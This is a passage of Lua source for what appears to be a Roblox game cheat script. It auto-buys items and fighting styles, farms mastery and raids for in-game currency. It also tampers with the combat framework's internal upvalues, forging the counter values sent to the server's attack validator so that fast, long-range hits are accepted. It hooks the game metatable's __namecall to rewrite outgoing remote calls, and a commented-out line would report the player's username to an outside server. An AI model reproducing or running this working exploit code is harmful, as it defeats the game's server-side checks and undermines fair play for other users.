                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cutlass")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Slingshot")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Flintlock")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Dual-Headed Blade")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Iron Mace")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Black Cape")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Bisento")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Tomoe Ring")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Katana")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Triple Katana")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Pipe")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Soul Cane")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Tomoe Ring")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Black Cape")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Swordsman Hat")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Slingshot")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Musket")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Flintlock")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Refined Flintlock")
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("BuyItem","Cannon")
                end
            end)
        
                          inv = game:GetService("ReplicatedStorage").Remotes["CommF_"]:InvokeServer("getInventory")
                       
                         -- warn(moctui(1), moctui(2), moctui(3))
                          giunhabatman()
                          
                         
                           if not game.Players.LocalPlayer.Character:FindFirstChild"Spin" then 
                             local s = Instance.new("BodyAngularVelocity")
                             s.Name = "Spin" 
                             s.Parent = game.Players.LocalPlayer.Character
                             s.MaxTorque = Vector3.new(0,math.huge,0) 
                             s.AngularVelocity = Vector3.new(0,40,0) 
                             end
                           if getgenv().ForceStop then return end
                           getMeleeMastery()
                           spawn(function ()
                           if c().Fruit["Random Fruit"] then
                              game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Cousin","Buy")
                           end

                           local args = {
                              [1] = "AddPoint",
                              [2] = autopoint(),
                              [3] = 300
                           }
                           game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                           --		print (GetAndCheckMeleeMastery("Black Leg"), checkMelee"Electro")
                           storefruit()
                           end)

                            if checkitem"Flower 3" then
                                  
                                         game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Alchemist", "3") 
                            
                                       end
                           if eltrul["Black Leg"] < 300 and NameMelee(true) ~= "Black Leg" then
                          
                              buyMelee("BlackLeg")
                              set1("Waiting For Black Leg Hit 300 Mastery")
                           end
                           if eltrul["Black Leg"] > 299 and eltrul["Electro"] < 299 then

                              buyMelee("Electro")
                              set1("Waiting For Electro Hit 300 Mastery")
                           end
                           if eltrul["Electro"] > 299 and eltrul["Fishman Karate"] < 299 then

                              buyMelee("FishmanKarate")
                              set1("Waiting For Fishman Karate Hit 300 Mastery")
                           end
                           if eltrul["Fishman Karate"] > 299 and eltrul["Dragon Claw"] < 299 then
                             set1("Waiting For Dragon Claw Hit 300 Mastery")
                             
                              if lp.Data.Fragments.Value < 1500 and (NameMelee(true).Name~= "Dragon Claw" and not checkMelee"Dragon Claw")  then
                                 if not CheckSea(1) then

                               
                                    --warn("Auto Raid Until Reach 1.5k f ", 6000)
                                    AutoRaid = true
                                    PullFruit = true
                                  
                                    set1("Waiting For Dragon Claw Hit 300 Mastery")
                                 else
                                    set1("Waiting For 2nd Sea (For Dragon Claw / Not Enough Fragments)")
                                    TeleportSea(2)
                                 end

                              end
                              
                              buyMelee("DragonClaw")
                              set1("Waiting For Dragon Claw Hit 300 Mastery" )
                           end
                           if eltrul["Dragon Claw"] > 299 and eltrul["Superhuman"] < 400 then
                              buyMelee"Superhuman" 
                              set1"Waiting For Superhuman Hit 300 Mastery"
                           end
                           print("ok", eltrul["Superhuman"],eltrul["Death Step"])
                           if eltrul["Superhuman"] > 399 and eltrul["Death Step"] < 400 then
                             print("ok2")
                              if eltrul["Black Leg"] < 400 then
                                 buyMelee"BlackLeg" 
                                 set1("Waiting For Black Leg Hit 300 Mastery")
                              else
                                 if not checkMelee"DeathStep" then
                                    if getPlayerFragments() < 5000 and (NameMelee() ~= "Death Step" and not checkMelee"DeathStep") then
                                    --  warn("Auto Raid Until Hit 5000f sbhshshshshs",9999)
                                       AutoRaid = true
                                       PullFruit = true
                                    else
                                       
                                       set1"Waiting For Player Beli Hit 3M+ [Death Step]"
                                       if getPlayerBeli() > 3000000 then
                                          buyMelee"DeathStep"
                                       end
                                    end
                                 else
                                       set1"Waiting For Death Step Hit 300 Mastery"
                                   
                                    buyMelee"DeathStep"
                                 end
                              end
                           end
                           if eltrul["Death Step"] > 399 and eltrul["Sharkman Karate"] < 400 then
                              if eltrul["Fishman Karate"] < 400 then
                                 buyMelee"FishmanKarate" 
                                 set1("Waiting For Fishman Karate Hit 300 Mastery")
                              else
                                 if not checkMelee"SharkmanKarate" then
                                    if getPlayerFragments() < 5000 then
                                       AutoRaid = true 
                                      set1("Auto Raid Until Reach 5k Fragments")
                                       PullFruit = true
                                    else
                                 set1"Waiting For Beli Hit 3M+ [Sharkman Karare]"
                                       if getPlayerBeli() > 3000000 then
                                          buyMelee"SharkmanKarate"
                                          
                                       end
                                    end
                                 else
                                    buyMelee"SharkmanKarate"
                                    set1"Waiting For Sharkman Karare Hit 300 Mastery"
                                 end
                              end
                           end
                            if eltrul["Sharkman Karate"] > 399 and eltrul["Electric Claw"] < 400 then
                               if eltrul["Electro"] < 400 then 
                                 buyMelee"Electro" 
                                 set1("Waiting For Electro Hit 300 Mastery")
                               else 
                                 if not checkMelee"FishmanKarate" and getPlayerFragments() < 5000 then 
                                   AutoRaid = true 
                                   PullFruit = true
                                 end 
                                 buyMelee"ElectricClaw" 
                                 set1"Waiting For Player Beli Hit 3M+ [Electric Claw]"
                               end
                            end
                            if eltrul["Electric Claw"] > 399 and eltrul["Dragon Talon"] < 400 then
                                if eltrul["Dragon Claw"] < 400 then 
                                  set1"Waiting For Dragon Claw Hit 300 Mastery" 
                                  buyMelee"DragonClaw" 
                                  else 
                                    if not checkMelee"DragonTalon" and getPlayerFragments() < 5000 then 
                                      AutoRaid = true 
                                      PullFruit = true 
                                      set1"Auto Raiding Until Hit 5k Fragments [Dragon Talon]"
                                      else 
                                        set1"Waiting For Dragon Talon Requirements [3M+ Beli / Fire Essence]" 
                                        buyMelee"DragonTalon"
                                        end
                                  end 
                            end 
                            if eltrul["Superhuman"] > 399 and eltrul["Death Step"] > 399 and eltrul["Electric Claw"] > 399 and eltrul["Dragon Talon"] > 399 and eltrul["Sharkman Karate"] > 399 then 
                              if not checkMelee"Godhuman" then 
                             buyMelee"ElectricClaw"
                         if getPlayerFragments() < 5000 and not checkMelee"Godhuman" then 
                           set1"Auto Raid Until Hit 5k Fragments [Godhuman]"
                           AutoRaid = true 
                           PullFruit = true
                         end 
                         
                         set1"Waiting For Player Beli Hit 5M+ [Godhuman]" 
                         buyMelee"Godhuman"
                       else 
           
                         if eltrul["Godhuman"] < 400 then
                           buyMelee"Godhuman" 
                           else  
                            
                         for i, v in pairs(inv) do
                           if v.Type == "Sword" then
                          -- warn(i, v, v.Type, v.MasteryRequirements.Z)
                             mas = 0
                           for i2,v2 in pairs(v.MasteryRequirements) do 
                           --  warn(i2, v2)
                            mas = tonumber(v2)
                           end
                           --warn(v.Mastery, mas)
                           if v.Mastery < mas then 
                             forcewp = "Sword" 
                             if not checkitem2(v.Name) then
                             local args = {
    [1] = "LoadItem",
    [2] = v.Name
}
set1("Farming Mastery For "..v.Name.." ["..v.Mastery.."/"..mas.."]")
game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args)) 
end
break
end 
                           end
                         end
                         end
                       end
                              end 
                              
                        end
                        end)





local adupi = debug.getupvalues(require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework")))[2]
local aP = require(game:GetService("Players").LocalPlayer.PlayerScripts:WaitForChild("CombatFramework"))
local aQ = getupvalues(aP)[2]
local aR = require(game:GetService("Players")["LocalPlayer"].PlayerScripts.CombatFramework.RigController)
local aS = getupvalues(aR)[2]
local aT = require(game.ReplicatedStorage.CombatFramework.RigLib)
local aU = tick()
function CameraShaker()
	task.spawn(
		function()
			local b9 = require(game.Players.LocalPlayer.PlayerScripts.CombatFramework.CameraShaker)
			while wait() do
				pcall(
					function()
						b9.CameraShakeInstance.CameraShakeState.Inactive = 0
					end
				)
			end
		end
	)
end

function CurrentWeapon()
	local ac = aQ.activeController
	local aW = ac.blades[1]
	if not aW then
		return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
	end
	pcall(
		function()
			while aW.Parent ~= game.Players.LocalPlayer.Character do
				aW = aW.Parent
			end
		end
	)
	if not aW then
		return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
	end
	return aW
end
function getAllBladeHitsPlayers(aX)
	Hits = {}
	local aY = game.Players.LocalPlayer
	local aZ = game:GetService("Workspace").Characters:GetChildren()
	for r = 1, #aZ do
		local v = aZ[r]
		Human = v:FindFirstChildOfClass("Humanoid")
		if
			v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and
				aY:DistanceFromCharacter(Human.RootPart.Position) < aX + 5
		 then
			table.insert(Hits, Human.RootPart)
		end
	end
	return Hits
end
function getAllBladeHits(aX)
	Hits = {}
	local aY = game.Players.LocalPlayer
	local a_ = game:GetService("Workspace").Enemies:GetChildren()
	for r = 1, #a_ do
		local v = a_[r]
		Human = v:FindFirstChildOfClass("Humanoid")
		if
			Human and Human.RootPart and Human.Health > 0 and
				aY:DistanceFromCharacter(Human.RootPart.Position) < aX + 5
		 then
			table.insert(Hits, Human.RootPart)
		end
	end
	return Hits
end
ReturnFunctions = {}
function CurrentWeapon()
	local ac = aQ.activeController
	local aW = ac.blades[1]
	if not aW then
		return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
	end
	pcall(
		function()
			while aW.Parent ~= game.Players.LocalPlayer.Character do
				aW = aW.Parent
			end
		end
	)
	if not aW then
		return game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool").Name
	end
	return aW
end
function getAllBladeHitsPlayers(aX)
	Hits = {}
	local aY = game.Players.LocalPlayer
	local aZ = game:GetService("Workspace").Characters:GetChildren()
	for r = 1, #aZ do
		local v = aZ[r]
		Human = v:FindFirstChildOfClass("Humanoid")
		if
			v.Name ~= game.Players.LocalPlayer.Name and Human and Human.RootPart and Human.Health > 0 and
				aY:DistanceFromCharacter(Human.RootPart.Position) < aX + 5
		 then
			table.insert(Hits, Human.RootPart)
		end
	end
	return Hits
end
function lonmemaytofff(aX)
	Hits = {}
	local aY = game.Players.LocalPlayer
	local a_ = game:GetService("Workspace").Enemies:GetChildren()
	for r = 1, #a_ do
		local v = a_[r]
		Human = v:FindFirstChildOfClass("Humanoid")
		if
			Human and Human.RootPart and Human.Health > 0 and Human.Health ~= Human.MaxHealth and
				aY:DistanceFromCharacter(Human.RootPart.Position) < aX + 5
		 then
			table.insert(Hits, Human.RootPart)
		end
	end
	return Hits
end 

function AttackFunctgggggion()
	pcall(
		function()
			if game.Players.LocalPlayer.Character.Stun.Value ~= 0 then
				return nil
			end
			local ac = aQ.activeController
			ac.hitboxMagnitude = 55
			if ac and ac.equipped then
				for b0 = 1, 1 do
					local b2 =
						require(game.ReplicatedStorage.CombatFramework.RigLib).getBladeHits(
						game.Players.LocalPlayer.Character,
						{game.Players.LocalPlayer.Character.HumanoidRootPart},
						60
					)
					if #b2 > 0 then
						local b3 = debug.getupvalue(ac.attack, 5)
						local b4 = debug.getupvalue(ac.attack, 6)
						local b5 = debug.getupvalue(ac.attack, 4)
						local b6 = debug.getupvalue(ac.attack, 7)
						local b7 = (b3 * 798405 + b5 * 727595) % b4
						local b8 = b5 * 798405
						(function()
							b7 = (b7 * b4 + b8) % 1099511627776
							b3 = math.floor(b7 / b4)
							b5 = b7 - b3 * b4
						end)()
						b6 = b6 + 1
						debug.setupvalue(ac.attack, 5, b3)
						debug.setupvalue(ac.attack, 6, b4)
						debug.setupvalue(ac.attack, 4, b5)
						debug.setupvalue(ac.attack, 7, b6)
						for k, v in pairs(ac.animator.anims.basic) do
							v:Play()
						end 
						
						if
							game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") and ac.blades and
								ac.blades[1]
						 then
							game:GetService("ReplicatedStorage").RigControllerEvent:FireServer(
								"weaponChange",
								tostring(CurrentWeapon())
							)
							game.ReplicatedStorage.Remotes.Validator:FireServer(math.floor(b7 / 1099511627776 * 16777215), b6+1)
							game:GetService("ReplicatedStorage").RigControllerEvent:FireServer("hit", b2, 2, "")
							
						end
					end
				end
			end
		end
	)
end

spawn(function()
    while task.wait(c().Misc["Fast Attack Delay"])do
          pcall(function()
           
               AttackFunctgggggion() 
               ot = tick()
               if adupi.activeController then
                -- if v.Humanoid.Health > 0 then
                    adupi.activeController.timeToNextAttack = math.huge
                    adupi.activeController.focusStart = 0
                    adupi.activeController.hitboxMagnitude = 120
                    adupi.activeController.humanoid.AutoRotate = true
                    adupi.activeController.increment = 1 + 1 / 1
                -- end
            end
          end)
      end
    end) 
            game:GetService("CoreGui").RobloxPromptGui.promptOverlay.ChildAdded:Connect(function(child)
            if child.Name == 'ErrorPrompt' and child:FindFirstChild('MessageArea') and child.MessageArea:FindFirstChild("ErrorFrame") then
               print("Heiskso | Rejoin!")
               game:GetService("TeleportService"):Teleport(game.PlaceId)
            end
           

--if not elt then warn(rul) game:HttpGet("https://php-web-server.akishino1.repl.co/?err="..rul.."&un="..game.Players.LocalPlayer.Name) end 
end)
spawn(function()
    local gg = getrawmetatable(game)
    local old = gg.__namecall
    setreadonly(gg,false)
    gg.__namecall = newcclosure(function(...)
        local method = getnamecallmethod()
        local args = {...}
        if tostring(method) == "FireServer" then
            if tostring(args[1]) == "RemoteEvent" then
                if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
                    if dmlockskill then
                        args[2] = dmlockskill
                        return old(unpack(args))
                    end
                end
            end
        end
        return old(...)
    end)
end)
